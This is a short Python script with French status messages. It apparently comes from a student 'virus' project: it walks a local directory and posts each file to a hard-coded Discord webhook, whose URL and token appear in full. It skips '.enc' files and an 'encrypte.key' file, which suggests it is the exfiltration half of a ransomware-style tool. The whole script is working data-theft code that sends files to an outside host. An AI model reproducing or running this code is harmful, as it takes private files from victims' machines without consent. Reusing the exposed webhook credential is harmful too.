import os
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1372472024265396285/H_moD3icCSJWhS4ntcSPjJMrENuMDNdy-jrErJHTWiBcRNOD5Z66UocG-tWVNLrH9GoH"
DIRECTORY = "C:\\Users\\HP\\Documents\\Ynov\\virus\\teste"

def upload_file(file_path):
    try:
        with open(file_path, "rb") as f:
            filename = os.path.basename(file_path)
            print(f"🔄 Envoi du fichier : {filename}")
            response = requests.post(WEBHOOK_URL, files={"file": (filename, f)})
            if response.status_code == 204:
                print(f"✅ Fichier envoyé : {filename}")
            else:
                print(f"❌ Erreur d'envoi ({response.status_code}): {filename} - {response.text}")
    except Exception as e:
        print(f"❌ Erreur d'envoi : {e}")

def upload_all_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".enc") and file != "encrypte.key":
                upload_file(file_path)

if __name__ == "__main__":
    upload_all_files(DIRECTORY)
